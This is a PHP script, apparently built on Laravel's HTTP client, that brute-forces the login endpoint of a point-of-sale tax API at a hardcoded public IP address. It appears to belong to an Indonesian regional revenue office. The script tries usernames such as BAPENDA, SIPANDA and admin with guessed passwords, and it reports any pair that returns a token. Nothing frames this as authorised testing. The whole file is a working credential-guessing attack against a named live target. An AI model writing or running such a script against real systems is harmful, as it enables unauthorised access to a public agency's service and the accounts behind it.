<?php
require 'vendor/autoload.php';
use Illuminate\Support\Facades\Http;
\$app = new \Illuminate\Container\Container();
\Illuminate\Support\Facades\Facade::setFacadeApplication(\$app);
\$app->singleton('http', function() { return new \Illuminate\Http\Client\Factory(); });
\$base_url = 'http://103.182.72.241:8000/pospbb/Api_pos';
\$usernames = ['BAPENDA', 'admin', 'user', 'ptpos', 'pos', 'SIPANDA', 'BAUBAU'];
\$passwords = ['password123', 'Bapenda2026!', '123456', 'admin', 'bapenda', 'baubau'];
foreach (\$usernames as \$u) {
    foreach (\$passwords as \$p) {
        try {
            \$response = \Illuminate\Support\Facades\Http::asForm()->timeout(3)
                ->post("\$base_url/login", ['USERNAME' => \$u, 'PASSWORD' => \$p]);
            if (\$response->status() === 200 && strpos(\$response->body(), '"token"') !== false) {
                echo "✅ FOUND: \$u / \$p\n"; exit;
            }
        } catch (\Exception \$e) {}
    }
}
echo "❌ No lucky guess.\n";
